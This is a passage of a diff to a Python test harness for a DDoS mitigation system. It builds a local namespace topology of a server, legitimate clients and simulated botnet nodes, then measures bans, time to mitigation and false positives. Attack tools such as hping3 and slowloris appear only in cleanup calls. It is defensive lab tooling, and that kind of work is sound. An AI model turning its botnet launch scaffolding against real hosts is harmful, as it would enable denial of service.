@@ -1,265 +1,953 @@
 #!/usr/bin/env python3
+"""
+Distributed DDoS Mitigation Testing Suite
+==========================================
+Creates a realistic multi-namespace network topology:
+  - 1 server namespace (10.0.0.1) with Nginx + Gunicorn + control_plane.py
+  - 40 legitimate client namespaces (10.0.1.1-10.0.1.40) with tc-simulated quality
+  - 10 botnet attacker namespaces  (10.0.2.1-10.0.2.10)
+
+Topology:
+  All namespaces connect through a Linux bridge (ddos_br0) in the DEFAULT namespace.
+  The server's veth_server interface is the XDP attachment point — all bridged
+  traffic enters server_ns through this single interface, so the eBPF filter
+  sees every packet from every client/attacker.
+
+Usage:
+    sudo python3 test_distributed_suite.py
+"""
 
 import subprocess
 import time
 import sys
 import os
 import threading
+import signal
 import random
+import atexit
 
-# --- CONFIGURATION ---
+# ─────────────────────────────── CONFIGURATION ───────────────────────────────
+
 SERVER_IP = "10.0.0.1"
 SERVER_NS = "server_ns"
-ATTACKER_NS = "attacker_ns"  # We use the existing attacker_ns as our bridge namespace
+BRIDGE_NAME = "ddos_br0"      # Bridge lives in the DEFAULT namespace
 
-NUM_BOTS = 15
-NUM_LEGIT = 40
+LEGIT_COUNT = 40               # Number of legitimate client namespaces
+LEGIT_IP_PREFIX = "10.0.1"     # Legit IPs: 10.0.1.1 – 10.0.1.40
 
-# We use the 10.0.0.0/24 subnet configured by setup.sh
-BOT_IP_START = 10
-LEGIT_IP_START = 100
+BOTNET_COUNT = 10              # Number of botnet attacker namespaces
+BOTNET_IP_PREFIX = "10.0.2"    # Botnet IPs: 10.0.2.1 – 10.0.2.10
 
-# ANSI Colors
-GREEN = "\033[92m"
-RED = "\033[91m"
+SUBNET_MASK = "/16"            # All nodes in 10.0.0.0/16
+HTTP_URL = f"http://{SERVER_IP}/"
+
+PROJECT_DIR = "/home/artur/DDoS-mitigation/code"
+NGINX_CONF = f"{PROJECT_DIR}/nginx.conf"
+CONTROL_PLANE = f"{PROJECT_DIR}/control_plane.py"
+PYTHON_VENV = f"{PROJECT_DIR}/venv/bin/python"
+LOG_FILE = "/tmp/mitigation_distributed_test.log"
+
+# ─────────────────────────────── ANSI COLORS ─────────────────────────────────
+
+GREEN  = "\033[92m"
+RED    = "\033[91m"
 YELLOW = "\033[93m"
-RESET = "\033[0m"
+CYAN   = "\033[96m"
+BOLD   = "\033[1m"
+RESET  = "\033[0m"
+
+# ────────────────────────── GLOBAL STATE ─────────────────────────────────────
 
 results = []
+_all_created_ns = []           # Track for cleanup
+_legit_traffic_stop = threading.Event()
+_legit_threads = []
+_daemon_proc = None
 
-def run_cmd(cmd, ns=None, bg=False, timeout=None):
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  SHELL HELPER
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def run(cmd, ns=None, bg=False, timeout=None):
+    """Execute a shell command, optionally inside a network namespace."""
     full_cmd = []
     if ns:
         full_cmd.extend(["ip", "netns", "exec", ns])
-    
-    if isinstance(cmd, list):
-        full_cmd.extend(cmd)
-    else:
+    if isinstance(cmd, str):
         full_cmd.extend(cmd.split())
+    else:
+        full_cmd.extend(cmd)
 
     if bg:
-        return subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    else:
-        try:
-            return subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
-        except subprocess.TimeoutExpired as e:
-            return e
+        return subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL)
+    try:
+        return subprocess.run(full_cmd, capture_output=True, text=True,
+                              timeout=timeout)
+    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
+        return None
 
-def cleanup_topology():
-    print("[*] Cleaning up distributed namespaces and processes...")
-    subprocess.run(["pkill", "-f", "control_plane.py"], stderr=subprocess.DEVNULL)
-    
-    # Restore attacker_ns to its original state (remove bridge, restore IP)
-    subprocess.run(["ip", "netns", "exec", ATTACKER_NS, "ip", "link", "set", "dev", "veth_attacker", "nomaster"], stderr=subprocess.DEVNULL)
-    subprocess.run(["ip", "netns", "exec", ATTACKER_NS, "ip", "link", "del", "br0"], stderr=subprocess.DEVNULL)
-    subprocess.run(["ip", "netns", "exec", ATTACKER_NS, "ip", "addr", "add", "10.0.0.2/24", "dev", "veth_attacker"], stderr=subprocess.DEVNULL)
-    
-    res = subprocess.run(["ip", "netns", "list"], capture_output=True, text=True)
-    for line in res.stdout.splitlines():
-        ns = line.split()[0]
-        if ns.startswith("bot_ns_") or ns.startswith("legit_ns_"):
-            subprocess.run(["ip", "netns", "del", ns])
 
-def setup_topology():
-    cleanup_topology()
-    print("[*] Setting up distributed topology inside existing setup.sh environment...")
-    
-    # Use attacker_ns as a bridge
-    run_cmd(f"ip addr del 10.0.0.2/24 dev veth_attacker", ns=ATTACKER_NS)
-    run_cmd(f"ip link add name br0 type bridge", ns=ATTACKER_NS)
-    run_cmd(f"ip link set dev veth_attacker master br0", ns=ATTACKER_NS)
-    run_cmd(f"ip link set dev br0 up", ns=ATTACKER_NS)
-    
-    # Bots
-    print(f"[*] Creating {NUM_BOTS} botnet namespaces...")
-    for i in range(1, NUM_BOTS + 1):
-        ns_name = f"bot_ns_{i}"
-        ip = f"10.0.0.{BOT_IP_START + i}"
-        run_cmd(f"ip netns add {ns_name}")
-        run_cmd(f"ip link add vb_{i} type veth peer name vbr_{i}")
-        run_cmd(f"ip link set vb_{i} netns {ns_name}")
-        run_cmd(f"ip link set vbr_{i} netns {ATTACKER_NS}")
-        
-        run_cmd(f"ip link set vbr_{i} master br0", ns=ATTACKER_NS)
-        run_cmd(f"ip link set vbr_{i} up", ns=ATTACKER_NS)
-        
-        run_cmd(f"ip addr add {ip}/24 dev vb_{i}", ns=ns_name)
-        run_cmd(f"ip link set vb_{i} up", ns=ns_name)
-        run_cmd(f"ip link set lo up", ns=ns_name)
-        
-    # Legit
-    print(f"[*] Creating {NUM_LEGIT} legitimate user namespaces (simulating mobile networks)...")
-    for i in range(1, NUM_LEGIT + 1):
-        ns_name = f"legit_ns_{i}"
-        ip = f"10.0.0.{LEGIT_IP_START + i}"
-        run_cmd(f"ip netns add {ns_name}")
-        run_cmd(f"ip link add vl_{i} type veth peer name vlr_{i}")
-        run_cmd(f"ip link set vl_{i} netns {ns_name}")
-        run_cmd(f"ip link set vlr_{i} netns {ATTACKER_NS}")
-        
-        run_cmd(f"ip link set vlr_{i} master br0", ns=ATTACKER_NS)
-        run_cmd(f"ip link set vlr_{i} up", ns=ATTACKER_NS)
-        
-        run_cmd(f"ip addr add {ip}/24 dev vl_{i}", ns=ns_name)
-        run_cmd(f"ip link set vl_{i} up", ns=ns_name)
-        run_cmd(f"ip link set lo up", ns=ns_name)
-        
-        if random.choice([True, False]):
-            run_cmd(f"tc qdisc add dev vl_{i} root netem delay 100ms 20ms loss 1%", ns=ns_name)
+# ═══════════════════════════════════════════════════════════════════════════════
+#  INFRASTRUCTURE: Namespace & Network Topology Management
+# ═══════════════════════════════════════════════════════════════════════════════
 
-def start_mitigation():
-    """Restarts the Python control plane to flush eBPF maps and states."""
-    run_cmd("pkill -f control_plane.py", ns=SERVER_NS)
+def cleanup_all():
+    """Delete every namespace, bridge, and process created by this script."""
+    global _daemon_proc
+
+    print(f"\n{YELLOW}[*] Cleaning up all namespaces and processes...{RESET}")
+
+    # Kill daemon and services
+    subprocess.run(["pkill", "-f", "control_plane.py"], capture_output=True)
+    subprocess.run(["pkill", "-f", "gunicorn"], capture_output=True)
+    subprocess.run(["pkill", "-f", "nginx: master process"], capture_output=True)
+    if _daemon_proc and _daemon_proc.poll() is None:
+        _daemon_proc.kill()
+        _daemon_proc.wait()
+        _daemon_proc = None
+
+    # Kill attack tools in every namespace before deleting them
+    for ns in list(_all_created_ns):
+        run("pkill -9 -f hping3", ns=ns)
+        run("pkill -9 -f slowloris", ns=ns)
+        run("pkill -9 -f rudy", ns=ns)
+        run("pkill -9 -f wrk", ns=ns)
+        run("pkill -9 -f python3", ns=ns)
+
+    # Delete namespaces (automatically removes veths inside them)
+    for ns in list(_all_created_ns):
+        subprocess.run(["ip", "netns", "del", ns],
+                       capture_output=True, timeout=10)
+    _all_created_ns.clear()
+
+    # Delete the bridge (host namespace)
+    subprocess.run(["ip", "link", "del", BRIDGE_NAME],
+                   capture_output=True, timeout=5)
+
+    try:
+        os.remove(LOG_FILE)
+    except FileNotFoundError:
+        pass
+
+    print(f"{GREEN}[+] Cleanup complete.{RESET}")
+
+
+atexit.register(cleanup_all)
+signal.signal(signal.SIGINT, lambda s, f: sys.exit(1))
+signal.signal(signal.SIGTERM, lambda s, f: sys.exit(1))
+
+
+def create_host_bridge():
+    """Create the central bridge in the DEFAULT (host) namespace.
+
+    All client/attacker namespaces and the server namespace connect here.
+    This mimics a LAN switch in a real data center.
+    """
+    subprocess.run(["ip", "link", "add", BRIDGE_NAME, "type", "bridge"],
+                   capture_output=True)
+    subprocess.run(["ip", "link", "set", BRIDGE_NAME, "up"],
+                   capture_output=True)
+
+
+def create_server_ns():
+    """Create the server namespace and connect it to the host bridge.
+
+    Topology:
+        [server_ns]  veth_server  ←── veth pair ──→  veth_srv_br  →  ddos_br0
+                     (10.0.0.1)                       (bridge port)
+
+    control_plane.py attaches XDP to veth_server. Because all traffic from
+    every client/attacker traverses the bridge and enters server_ns through
+    this single veth, XDP sees EVERY ingress packet.
+    """
+    # Create namespace
+    subprocess.run(["ip", "netns", "add", SERVER_NS], capture_output=True)
+    _all_created_ns.append(SERVER_NS)
+
+    # Create veth pair: veth_server (→ server_ns) ↔ veth_srv_br (→ host bridge)
+    subprocess.run(["ip", "link", "add", "veth_server", "type", "veth",
+                    "peer", "name", "veth_srv_br"], capture_output=True)
+
+    # Move server end into server_ns
+    subprocess.run(["ip", "link", "set", "veth_server", "netns", SERVER_NS],
+                   capture_output=True)
+
+    # Attach host end to the bridge
+    subprocess.run(["ip", "link", "set", "veth_srv_br", "master", BRIDGE_NAME],
+                   capture_output=True)
+    subprocess.run(["ip", "link", "set", "veth_srv_br", "up"],
+                   capture_output=True)
+
+    # Configure server_ns
+    run(f"ip addr add {SERVER_IP}{SUBNET_MASK} dev veth_server", ns=SERVER_NS)
+    run("ip link set veth_server up", ns=SERVER_NS)
+    run("ip link set lo up", ns=SERVER_NS)
+
+    # Disable checksum offloading (required for XDP on veth)
+    run("ethtool -K veth_server tx off rx off", ns=SERVER_NS)
+
+
+def create_client_ns(ns_name, ip_addr):
+    """Create a client/attacker namespace and connect it to the host bridge.
+
+    Topology:
+        [ns_name]  veth_in  ←── veth pair ──→  vo_<ns_name>  →  ddos_br0
+                   (ip_addr)                    (bridge port)
+    """
+    veth_inner = "veth_in"
+    # Truncate outer name to stay under the 15-char IFNAMSIZ limit
+    veth_outer = f"vo_{ns_name[:12]}"
+
+    subprocess.run(["ip", "netns", "add", ns_name], capture_output=True)
+    _all_created_ns.append(ns_name)
+
+    # Create veth pair in host namespace
+    subprocess.run(["ip", "link", "add", veth_outer, "type", "veth",
+                    "peer", "name", veth_inner], capture_output=True)
+
+    # Move inner end into client namespace
+    subprocess.run(["ip", "link", "set", veth_inner, "netns", ns_name],
+                   capture_output=True)
+
+    # Attach outer end to host bridge
+    subprocess.run(["ip", "link", "set", veth_outer, "master", BRIDGE_NAME],
+                   capture_output=True)
+    subprocess.run(["ip", "link", "set", veth_outer, "up"],
+                   capture_output=True)
+
+    # Configure client side
+    run(f"ip addr add {ip_addr}{SUBNET_MASK} dev {veth_inner}", ns=ns_name)
+    run(f"ip link set {veth_inner} up", ns=ns_name)
+    run("ip link set lo up", ns=ns_name)
+
+
+def apply_tc(ns_name, profile):
+    """Apply tc netem to simulate varying network quality.
+
+    Profiles:
+      'perfect'    — no shaping (LAN speed)
+      'broadband'  — 20ms ±2ms latency
+      'mobile_3g'  — 150ms ±40ms latency, 2% loss
+      'mobile_bad' — 300ms ±80ms latency, 5% loss, 1% corruption
+    """
+    dev = "veth_in"
+    run(f"tc qdisc del dev {dev} root", ns=ns_name)
+
+    if profile == "perfect":
+        return
+    elif profile == "broadband":
+        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
+             "delay", "20ms", "2ms", "distribution", "normal"], ns=ns_name)
+    elif profile == "mobile_3g":
+        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
+             "delay", "150ms", "40ms", "distribution", "normal",
+             "loss", "2%"], ns=ns_name)
+    elif profile == "mobile_bad":
+        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
+             "delay", "300ms", "80ms", "distribution", "normal",
+             "loss", "5%", "corrupt", "1%"], ns=ns_name)
+
+
+def start_server_services():
+    """Start Nginx, Gunicorn, and the mitigation daemon inside server_ns."""
+    global _daemon_proc
+
+    # Prepare logs
+    subprocess.run(["mkdir", "-p", "/var/log/nginx"], capture_output=True)
+    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
+        open(lf, "w").close()
+
+    # SSL certs (reuse if they exist)
+    if not os.path.isfile("/etc/ssl/certs/nginx-selfsigned.crt"):
+        subprocess.run([
+            "openssl", "req", "-x509", "-nodes", "-days", "365",
+            "-newkey", "rsa:2048",
+            "-keyout", "/etc/ssl/private/nginx-selfsigned.key",
+            "-out", "/etc/ssl/certs/nginx-selfsigned.crt",
+            "-subj", "/C=PL/ST=Masovian/L=Warsaw/O=PoC/CN=twojadomena.pl"
+        ], capture_output=True)
+
+    # Create dummy backend app
+    dummy_app = os.path.join(PROJECT_DIR, "dummy_app.py")
+    with open(dummy_app, "w") as f:
+        f.write(
+            'def app(environ, start_response):\n'
+            '    data = b"Backend is running flawlessly!\\n"\n'
+            '    start_response("200 OK", [\n'
+            '        ("Content-Type", "text/plain"),\n'
+            '        ("Content-Length", str(len(data)))\n'
+            '    ])\n'
+            '    return iter([data])\n'
+        )
+
+    # Start Gunicorn
+    run([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
+         "--workers", "4", "--threads", "10", "-b", "0.0.0.0:8080",
+         "dummy_app:app"], ns=SERVER_NS, bg=True)
     time.sleep(1)
-    project_dir = os.path.dirname(os.path.abspath(__file__))
-    venv_python = os.path.join(project_dir, "venv", "bin", "python")
-    control_plane_py = os.path.join(project_dir, "control_plane.py")
-    cmd = ["bash", "-c", f"{venv_python} {control_plane_py} > /tmp/mitigation_test.log 2>&1"]
-    run_cmd(cmd, ns=SERVER_NS, bg=True)
-    time.sleep(4) 
 
-# --- Background Traffic Generation ---
-stop_legit_traffic = threading.Event()
-legit_stats = {"success": 0, "fail": 0, "banned": 0}
+    # Start Nginx
+    run(["nginx", "-c", NGINX_CONF], ns=SERVER_NS)
+    time.sleep(0.5)
 
-def legit_user_worker(ns_name, ip):
-    while not stop_legit_traffic.is_set():
-        time.sleep(random.uniform(0.5, 2.0))
-        
-        ping_res = subprocess.run(["ip", "netns", "exec", ns_name, "ping", "-c", "1", "-W", "1", SERVER_IP], capture_output=True)
-        if ping_res.returncode != 0:
-            legit_stats["banned"] += 1
-            continue
-            
-        curl_res = subprocess.run(["ip", "netns", "exec", ns_name, "curl", "-s", "--max-time", "2", f"http://{SERVER_IP}/"], capture_output=True)
-        if curl_res.returncode == 0:
-            legit_stats["success"] += 1
-        else:
-            legit_stats["fail"] += 1
+    # Start mitigation daemon
+    try:
+        os.remove(LOG_FILE)
+    except FileNotFoundError:
+        pass
 
-def start_legit_traffic():
-    stop_legit_traffic.clear()
-    legit_stats["success"] = 0
-    legit_stats["fail"] = 0
-    legit_stats["banned"] = 0
-    threads = []
-    for i in range(1, NUM_LEGIT + 1):
-        t = threading.Thread(target=legit_user_worker, args=(f"legit_ns_{i}", f"10.0.0.{LEGIT_IP_START + i}"))
-        t.daemon = True
-        t.start()
-        threads.append(t)
-    return threads
+    cmd = ["ip", "netns", "exec", SERVER_NS, PYTHON_VENV, "-u", CONTROL_PLANE]
+    log_fd = open(LOG_FILE, "w")
+    _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)
 
-def stop_botnet(procs):
-    for p in procs:
+    # Wait for readiness
+    print("[*] Waiting for mitigation daemon to initialize...", end="", flush=True)
+    start = time.time()
+    ready = False
+    while time.time() - start < 60:
         try:
-            p.kill()
-        except:
-            pass
-    for i in range(1, NUM_BOTS + 1):
-        ns = f"bot_ns_{i}"
-        subprocess.run(["ip", "netns", "exec", ns, "pkill", "-9", "-f", "hping3"], stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "netns", "exec", ns, "pkill", "-9", "-f", "slowloris.py"], stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "netns", "exec", ns, "pkill", "-9", "-f", "rudy_script.py"], stderr=subprocess.DEVNULL)
-        subprocess.run(["ip", "netns", "exec", ns, "pkill", "-9", "-f", "curl"], stderr=subprocess.DEVNULL)
-
-def run_scenario(name, bot_cmd, duration, expected_engine=None):
-    print(f"\n{YELLOW}--- Scenario: {name} ---{RESET}")
-    start_mitigation()
-    
-    threads = start_legit_traffic()
-    print("[*] Generating legitimate background traffic... waiting for baseline.")
-    time.sleep(3)
-    
-    print(f"[*] Launching Distributed Botnet attack across {NUM_BOTS} nodes...")
-    procs = []
-    for i in range(1, NUM_BOTS + 1):
-        ns = f"bot_ns_{i}"
-        cmd = bot_cmd if isinstance(bot_cmd, str) else bot_cmd.copy()
-        p = run_cmd(cmd, ns=ns, bg=True)
-        procs.append(p)
-    
-    start_time = time.time()
-    banned_bots = set()
-    first_ttm = None
-    engine_detected = "None"
-    
-    while time.time() - start_time < duration:
-        try:
-            with open("/tmp/mitigation_test.log", "r") as f:
-                logs = f.read().splitlines()
-                for line in logs:
-                    if "[BAN]" in line:
-                        for i in range(1, NUM_BOTS + 1):
-                            bot_ip = f"10.0.0.{BOT_IP_START + i}"
-                            if bot_ip in line and bot_ip not in banned_bots:
-                                banned_bots.add(bot_ip)
-                                if first_ttm is None:
-                                    first_ttm = time.time() - start_time
-                                    if "SYN flood" in line: engine_detected = "L4 SYN Flood"
-                                    elif "Heuristic" in line: engine_detected = "L7 Heuristic"
-                                    elif "GRU" in line: engine_detected = "GRU ML"
+            with open(LOG_FILE, "r") as f:
+                if "Listening for Nginx logs" in f.read():
+                    ready = True
+                    break
         except FileNotFoundError:
             pass
-        
-        if len(banned_bots) >= NUM_BOTS * 0.8:
-            break
-            
+        print(".", end="", flush=True)
         time.sleep(0.5)
-        
-    print(f"[*] Stopping attack. Detected {len(banned_bots)}/{NUM_BOTS} bots.")
-    stop_botnet(procs)
-    
-    time.sleep(2)
-    stop_legit_traffic.set()
-    for t in threads:
-        t.join(timeout=1.0)
-        
-    print(f"[*] Legit User Stats: {legit_stats['success']} successful, {legit_stats['fail']} timeouts, {legit_stats['banned']} BANNED")
-    
-    passed = True
-    if len(banned_bots) < NUM_BOTS * 0.5:
-        print(f"{RED}[-] Failed: Less than 50% of the botnet was mitigated.{RESET}")
-        passed = False
-        
-    if legit_stats["banned"] > 0:
-        print(f"{RED}[-] Failed: Collateral damage detected! {legit_stats['banned']} legit users were banned (False Positives).{RESET}")
-        passed = False
-        
-    status = f"{GREEN}PASS{RESET}" if passed else f"{RED}FAIL{RESET}"
-    results.append([name, engine_detected, f"{first_ttm:.2f}s" if first_ttm else "N/A", f"{len(banned_bots)}/{NUM_BOTS}", legit_stats['banned'], status])
-    print(f"[{status}] {name}")
+    print()
+
+    if not ready:
+        print(f"{RED}[!] Daemon did not report ready within 60s!{RESET}")
+    else:
+        print(f"{GREEN}[+] Mitigation daemon is ready.{RESET}")
+        time.sleep(2)
+
+
+def reset_between_scenarios():
+    """Restart daemon + Nginx + Gunicorn to clear ban state between scenarios.
+
+    The control_plane.py keeps banned IPs in memory (BAN_TTL_SECONDS=300).
+    Without a full restart, bots banned in Scenario N remain banned in N+1,
+    preventing detection of new bans. This function performs a clean restart
+    while preserving the network topology (namespaces, bridge, veths).
+    """
+    global _daemon_proc
+
+    print(f"\n{CYAN}[*] Resetting mitigation environment...{RESET}")
+
+    # Kill the running daemon
+    if _daemon_proc and _daemon_proc.poll() is None:
+        _daemon_proc.kill()
+        _daemon_proc.wait()
+        _daemon_proc = None
+
+    # Kill Nginx and Gunicorn
+    run("pkill -f 'nginx: master process'", ns=SERVER_NS)
+    run(["pkill", "-f", "gunicorn"], ns=SERVER_NS)
+    time.sleep(0.5)
+
+    # Truncate all log files to clear stale [BAN] entries
+    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
+        open(lf, "w").close()
+
+    # Restart Gunicorn
+    run([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
+         "--workers", "4", "--threads", "10", "-b", "0.0.0.0:8080",
+         "dummy_app:app"], ns=SERVER_NS, bg=True)
+    time.sleep(1)
+
+    # Restart Nginx
+    run(["nginx", "-c", NGINX_CONF], ns=SERVER_NS)
+    time.sleep(0.5)
+
+    # Restart mitigation daemon with a fresh log file
+    try:
+        os.remove(LOG_FILE)
+    except FileNotFoundError:
+        pass
+
+    cmd = ["ip", "netns", "exec", SERVER_NS, PYTHON_VENV, "-u", CONTROL_PLANE]
+    log_fd = open(LOG_FILE, "w")
+    _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)
+
+    # Wait for readiness
+    start = time.time()
+    while time.time() - start < 30:
+        try:
+            with open(LOG_FILE, "r") as f:
+                if "Listening for Nginx logs" in f.read():
+                    break
+        except FileNotFoundError:
+            pass
+        time.sleep(0.5)
+    else:
+        print(f"{RED}[!] Daemon did not restart within 30s!{RESET}")
+        return
+
+    time.sleep(1)
+    print(f"{GREEN}[+] Environment reset complete.{RESET}")
+
+
+def build_topology():
+    """Build the full test topology: bridge + server + legit + botnet."""
+    legit_nodes = []     # [(ns_name, ip_addr, profile)]
+    botnet_nodes = []    # [(ns_name, ip_addr)]
+
+    # Clean any leftover state from a previous run
+    cleanup_all()
+
+    print(f"\n{BOLD}{CYAN}[*] Building network topology...{RESET}")
+
+    create_host_bridge()
+    create_server_ns()
+
+    # ── Legitimate clients ──
+    print(f"{CYAN}[*] Creating {LEGIT_COUNT} legitimate client namespaces...{RESET}")
+    profiles = ["perfect", "broadband", "mobile_3g", "mobile_bad"]
+    weights  = [0.30, 0.35, 0.25, 0.10]
+
+    for i in range(1, LEGIT_COUNT + 1):
+        ns  = f"legit_{i}"
+        ip  = f"{LEGIT_IP_PREFIX}.{i}"
+        create_client_ns(ns, ip)
+        profile = random.choices(profiles, weights=weights, k=1)[0]
+        apply_tc(ns, profile)
+        legit_nodes.append((ns, ip, profile))
+
+    print(f"{GREEN}[+] Legitimate clients ready. Profile distribution:{RESET}")
+    for p in profiles:
+        cnt = sum(1 for _, _, pr in legit_nodes if pr == p)
+        print(f"    {p}: {cnt} nodes")
+
+    # ── Botnet ──
+    print(f"{CYAN}[*] Creating {BOTNET_COUNT} botnet attacker namespaces...{RESET}")
+    for i in range(1, BOTNET_COUNT + 1):
+        ns = f"bot_{i}"
+        ip = f"{BOTNET_IP_PREFIX}.{i}"
+        create_client_ns(ns, ip)
+        botnet_nodes.append((ns, ip))
+
+    print(f"{GREEN}[+] Botnet ready: {len(botnet_nodes)} nodes.{RESET}")
+
+    # ── Server services ──
+    start_server_services()
+
+    return legit_nodes, botnet_nodes
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  LEGITIMATE BACKGROUND TRAFFIC
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def _legit_worker(ns_name, ip_addr, profile):
+    """Background thread: sends periodic HTTP requests from a legitimate ns."""
+    base_interval = {"perfect": 1.5, "broadband": 2.0,
+                     "mobile_3g": 3.0, "mobile_bad": 5.0}.get(profile, 2.0)
+
+    while not _legit_traffic_stop.is_set():
+        try:
+            run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
+                 "--max-time", "5", HTTP_URL], ns=ns_name, timeout=8)
+        except Exception:
+            pass
+        jitter = random.uniform(-0.5, 1.0)
+        _legit_traffic_stop.wait(max(0.5, base_interval + jitter))
+
+
+def start_legit_traffic(legit_nodes):
+    """Start background HTTP traffic from all legitimate client namespaces."""
+    _legit_traffic_stop.clear()
+    for ns, ip, profile in legit_nodes:
+        t = threading.Thread(target=_legit_worker, args=(ns, ip, profile),
+                             daemon=True)
+        t.start()
+        _legit_threads.append(t)
+    print(f"[+] Started background traffic from {len(legit_nodes)} legitimate users.")
+
+
+def stop_legit_traffic():
+    """Signal all legitimate traffic threads to stop."""
+    _legit_traffic_stop.set()
+    for t in _legit_threads:
+        t.join(timeout=3)
+    _legit_threads.clear()
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  VERIFICATION HELPERS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def is_ip_banned(ns_name):
+    """Check if an IP is blocked by XDP by pinging the server from its ns."""
+    res = run(f"ping -c 1 -W 1 {SERVER_IP}", ns=ns_name, timeout=5)
+    if res is None:
+        return True
+    return res.returncode != 0
+
+
+def tail_logs_for_bans(target_ips, timeout=25):
+    """Watch the daemon log for [BAN] entries matching any of the target IPs.
+
+    Returns: dict {ip: (engine, ttm)}
+    """
+    start_time = time.time()
+    found = {}
+    remaining = set(target_ips)
+
+    while time.time() - start_time < timeout and remaining:
+        try:
+            with open(LOG_FILE, "r") as f:
+                for line in f:
+                    if "[BAN]" not in line:
+                        continue
+                    for ip in list(remaining):
+                        if ip in line:
+                            engine = _classify_engine(line)
+                            found[ip] = (engine, time.time() - start_time)
+                            remaining.discard(ip)
+        except FileNotFoundError:
+            pass
+        if remaining:
+            time.sleep(0.5)
+
+    for ip in remaining:
+        found[ip] = ("None", None)
+
+    return found
+
+
+def _classify_engine(line):
+    """Classify the detection engine from a [BAN] log line."""
+    if "SYN flood" in line:
+        return "L4 SYN"
+    if "UDP" in line:
+        return "L4 UDP"
+    if "R.U.D.Y." in line:
+        return "L7 R.U.D.Y."
+    if "Slow connection" in line:
+        return "L4 SlowConn"
+    if "Heuristic" in line:
+        return "L7 Heuristic"
+    if "GRU" in line:
+        return "GRU ML"
+    return "Unknown"
+
+
+def check_collateral_damage(legit_nodes):
+    """Verify that NO legitimate user IP is banned.
+
+    Returns: (ok: bool, banned_list: [(ip, profile)])
+    """
+    banned_legit = []
+    for ns, ip, profile in legit_nodes:
+        if is_ip_banned(ns):
+            banned_legit.append((ip, profile))
+    return (len(banned_legit) == 0), banned_legit
+
+
+def verify_legit_http(legit_nodes, sample_size=10):
+    """Verify HTTP connectivity from a random sample of legitimate users.
+
+    Returns: (success, fail, total)
+    """
+    sample = random.sample(legit_nodes, min(sample_size, len(legit_nodes)))
+    success = fail = 0
+    for ns, ip, _ in sample:
+        res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
+                   "--max-time", "8", HTTP_URL], ns=ns, timeout=12)
+        if res and res.stdout.strip() == "200":
+            success += 1
+        else:
+            fail += 1
+    return success, fail, len(sample)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  ATTACK HELPERS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def launch_botnet(botnet_nodes, cmd_func):
+    """Launch an attack from every botnet node concurrently.
+
+    cmd_func(ns, ip) → subprocess.Popen or None.
+    Returns list of (proc, ns, ip).
+    """
+    procs = []
+    for ns, ip in botnet_nodes:
+        p = cmd_func(ns, ip)
+        if p:
+            procs.append((p, ns, ip))
+    return procs
+
+
+def kill_procs(procs):
+    """Kill all attack processes."""
+    for p, ns, _ in procs:
+        try:
+            p.kill()
+            p.wait(timeout=2)
+        except Exception:
+            pass
+        run("pkill -9 -f hping3", ns=ns)
+        run("pkill -9 -f wrk", ns=ns)
+        run("pkill -9 -f python3", ns=ns)
+
+
+def _write_script(path, content):
+    with open(path, "w") as f:
+        f.write(content)
+    os.chmod(path, 0o755)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  REPORT
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def report(name, ban_results, botnet_nodes, legit_nodes):
+    """Evaluate and display results for a distributed attack scenario."""
+    botnet_ips = [ip for _, ip in botnet_nodes]
+    banned_cnt = sum(1 for ip in botnet_ips if ban_results[ip][0] != "None")
+    total = len(botnet_ips)
+
+    ttm_vals = [ban_results[ip][1] for ip in botnet_ips
+                if ban_results[ip][1] is not None]
+    avg_ttm = sum(ttm_vals) / len(ttm_vals) if ttm_vals else None
+
+    engines = set(ban_results[ip][0] for ip in botnet_ips
+                  if ban_results[ip][0] != "None")
+
+    col_ok, col_list = check_collateral_damage(legit_nodes)
+    http_ok, http_fail, http_total = verify_legit_http(legit_nodes)
+
+    eff_pass  = banned_cnt >= total * 0.8
+    col_pass  = col_ok
+    http_pass = http_fail == 0
+    overall   = eff_pass and col_pass and http_pass
+
+    tag = f"{GREEN}PASS{RESET}" if overall else f"{RED}FAIL{RESET}"
+
+    print(f"\n  [{tag}] {BOLD}{name}{RESET}")
+    print(f"  ├── Botnet banned:     {banned_cnt}/{total} "
+          f"({'✅' if eff_pass else '❌'})")
+    if avg_ttm is not None:
+        print(f"  ├── Avg TTM:           {avg_ttm:.2f}s")
+    else:
+        print(f"  ├── Avg TTM:           N/A")
+    print(f"  ├── Engines:           {', '.join(engines) if engines else 'None'}")
+    print(f"  ├── Legit HTTP:        {http_ok}/{http_total} OK "
+          f"({'✅' if http_pass else '❌'})")
+    fp_str = "None ✅" if col_pass else f"{len(col_list)} BANNED ❌"
+    print(f"  └── False Positives:   {fp_str}")
+    if col_list:
+        for lip, lprof in col_list:
+            print(f"       └── FP: {lip} (profile: {lprof})")
+
+    results.append({
+        "scenario": name,
+        "banned": f"{banned_cnt}/{total}",
+        "avg_ttm": f"{avg_ttm:.2f}s" if avg_ttm else "N/A",
+        "engines": ", ".join(engines) if engines else "None",
